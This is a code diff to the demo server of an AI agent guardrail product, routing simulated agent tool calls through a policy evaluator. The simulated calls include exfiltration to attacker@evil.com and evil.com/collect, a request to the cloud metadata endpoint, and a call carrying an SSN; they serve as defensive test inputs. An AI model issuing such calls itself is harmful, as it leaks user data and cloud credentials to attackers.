@@ -4,10 +4,15 @@
 import Fastify from 'fastify'
 import { readFileSync, existsSync } from 'fs'
 import { resolve } from 'path'
+import { createRequire } from 'module'
 import { getDemoDb, seedDemo } from './lib/demo-store.js'
 import { log } from './lib/logger.js'
 import { sign, verify } from './lib/jwt.js'
 import { generateId } from './lib/crypto.js'
+
+// Load the real evaluator from the agent system
+const require = createRequire(import.meta.url)
+const { evaluateIntent } = require('../netlify/functions/src/engine/evaluator.js')
 
 const db = getDemoDb()
 const app = Fastify({ logger: false })
@@ -202,19 +207,53 @@ async function demoWorker() {
     await db.collection('tasks').doc(task.id).update({ status: 'running', startedAt: now })
     const runId = `run_${Date.now().toString(36)}`
     await db.collection('runs').doc(runId).set({ id: runId, agentId: 'agent_demo', taskId: task.id, status: 'running', startedAt: now, sessionId: `sess_${runId}`, totalActions: 0, allowedActions: 0, deniedActions: 0 })
-    const calls = [
-      { tool: 'task.started', decision: 'allow', reason: 'worker picked up task' },
-      { tool: 'lookup_order', decision: 'allow', reason: 'policy: allowed tool' },
-      { tool: 'check_inventory', decision: 'allow', reason: 'policy: allowed tool' },
-      { tool: 'send_email', decision: 'deny', reason: 'tool_explicitly_blocked' },
-      { tool: 'http_request', decision: 'deny', reason: 'domain_blocked: *.evil.com' },
+
+    // Get the demo policy for real evaluation
+    const policySnap = await db.collection('policies').doc('policy_demo').get()
+    const policy = policySnap.exists ? { id: policySnap.id, ...policySnap.data() as any } : null
+    const policies = policy ? [policy] : []
+
+    // Simulate tool calls through the REAL 11-step evaluator
+    const toolCalls = [
+      { tool: 'lookup_order', parameters: { orderId: 'ORD-42' } },
+      { tool: 'check_inventory', parameters: { sku: 'SKU-8821' } },
+      { tool: 'send_email', parameters: { to: 'attacker@evil.com', body: 'exfiltrated data' } },
+      { tool: 'http_request', parameters: { url: 'https://evil.com/collect', method: 'POST' } },
+      { tool: 'http_request', parameters: { url: 'http://169.254.169.254/latest/meta-data', method: 'GET' } },
+      { tool: 'lookup_order', parameters: { orderId: '1', ssn: '123-45-6789' } },
     ]
-    for (let i = 0; i < calls.length; i++) {
+
+    for (let i = 0; i < toolCalls.length; i++) {
       await new Promise(r => setTimeout(r, 150))
-      await db.collection('logs').doc(`log_${runId}_${i}`).set({ runId, taskId: task.id, agentId: 'agent_demo', tool: calls[i].tool, decision: calls[i].decision, reason: calls[i].reason, timestamp: new Date().toISOString() })
+      const call = toolCalls[i]
+
+      // Evaluate through the real 11-step enforcement engine
+      const decision = evaluateIntent({
+        intent: { tool: call.tool, parameters: call.parameters },
+        agentStatus: 'active',
+        policies,
+        sessionCost: null, dailyCost: null, toolCost: null,
+      })
+
+      await db.collection('logs').doc(`log_${runId}_${i}`).set({
+        runId, taskId: task.id, agentId: 'agent_demo',
+        tool: call.tool, decision: decision.decision,
+        reason: decision.reason || (decision.decision === 'allow' ? 'policy: within allowed tools + domains' : 'policy violation'),
+        parameters: call.parameters,
+        timestamp: new Date().toISOString(),
+      })
     }
+
+    const logSnap = await db.collection('logs').get()
+    const runLogs = logSnap.docs.filter(d => d.exists).map(d => d.data() as any).filter(l => l.runId === runId)
+
     const end = new Date().toISOString()
-    await db.collection('runs').doc(runId).update({ status: 'completed', endedAt: end, totalActions: calls.length, allowedActions: calls.filter(c => c.decision === 'allow').length, deniedActions: calls.filter(c => c.decision === 'deny').length })
+    await db.collection('runs').doc(runId).update({
+      status: 'completed', endedAt: end,
+      totalActions: runLogs.length,
+      allowedActions: runLogs.filter(l => l.decision === 'allow').length,
+      deniedActions: runLogs.filter(l => l.decision === 'deny').length,
+    })
     await db.collection('tasks').doc(task.id).update({ status: 'completed', completedAt: end })
   } catch (e: any) {}
 }
